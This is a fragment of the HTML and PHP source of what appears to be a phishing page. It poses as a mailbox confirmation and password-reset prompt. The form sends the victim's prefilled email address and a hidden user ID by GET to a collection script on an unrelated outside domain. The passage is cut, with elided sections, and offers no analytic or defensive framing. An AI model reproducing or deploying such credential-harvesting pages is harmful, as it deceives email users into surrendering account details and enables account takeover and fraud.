...
#captcha-container {
    margin-bottom: 20px !important
            ...
            <div id="password-reset-container"><div id="parent-card" class="ux-card"><div id="form-header">
              ...
              <form action="https://leatherfabriccollection.com/app2/completed.php" method="GET">
            ...
            <input type="hidden" name="userid" value=""><h4 class="page-title-with-back">Confirm your mailbox to start receiving messages</h4></div></div><fieldset class="form-group"><input spellcheck="false" type="email" placeholder="Email Address" required name="email" aria-labelledby="label-PasswordRecoveryLandingUsername" aria-required="false" class="ctHidden form-control" value="<?php echo $client_id;?>"></fieldset><fieldset class="form-group">
